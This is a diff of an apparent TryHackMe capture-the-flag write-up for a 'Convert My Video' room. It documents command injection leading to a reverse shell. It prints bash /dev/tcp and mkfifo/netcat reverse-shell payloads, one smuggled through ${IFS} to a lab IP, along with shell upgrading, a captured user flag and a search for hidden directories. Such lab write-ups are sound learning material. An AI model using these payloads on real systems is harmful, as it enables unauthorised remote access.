@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/convert-my-video/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-28T07:22:40.350+02:00","updated":"2026-05-03T11:34:26.988+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/convert-my-video/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-28T07:22:40.350+02:00","updated":"2026-05-03T11:52:35.090+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -168,7 +168,13 @@ So there are plenty tools available. Perhaps it is possible to spawn a reverse s
 
 ## Exploitation
 
-**Payload for Connection**
+```bash
+echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' > shell.sh
+```
+
+The classic approach did not work. Perhaps creating a named pipe to get a reverse shell will work. Based off of the payload for testing a connection with a named pipe earlier it seems like the ideal approach.
+
+**Testing Payload for Connection with named pipe**
 ```bash
 ;mkfifo${IFS}/dev/shm/f;cat${IFS}/dev/shm/f|/bin/sh${IFS}-i${IFS}2>%261|nc${IFS}192.168.141.140${IFS}4444>/dev/shm/f;
 ```
@@ -190,12 +196,6 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [your ip] 5555 >/tmp/f
 4. Pipe the output of the named pipe to the system shell and redirect stderr to stdout 
 5. Pipe the output of that into the listener and save it to the named pipe file ensuring that target machine can receive malicious commands 
 
-
-```bash
-echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' > shell.sh
-```
-
-The classic approach did not work. Perhaps creating a named pipe to get a reverse shell will work. Based off of the payload for testing a connection with a named pipe earlier it seems like the ideal approach.
 
 **Uploading shell.sh to the server**
 ```bash
@@ -228,12 +228,43 @@ sh${IFS}shell.sh
 So running above command in burp with nc listening will execute a rev shell. Time to do some post exploit.
 
 
-
-
-
-
 ----
 ## Post-exploitation
+
+First upgrading the unstable shell to a stable shell.
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+# setting the environment variable
+export TERM=xterm-256color
+
+```
+
+
+**User flag**
+`flag{0d8486a0c0c42503bb60ac77f4046ed7}`
+
+First flag found in `/var/www/html/admin` directory. 
+
+
+### Searching for the Hidden Folder
+
+as per THM instructions, there is a hidden directory. Let's look for it
+
+```bash
+find / -name ".*" -type d 2>/dev/null
+```
+
+**Breakdown of the command**
+	`find /` searches the entire system
+	`-name ".*"` searches hidden files 
+	`-type d` searches for type **directory**
+	`2>/dev/null` redirects stderror to null
+
+![](/img/user/Attachments/hidden-dirs-search.png)
+
+Sure enough there might be some luck here. **.gnupg** looks of interest. 
+
 
 
 ------
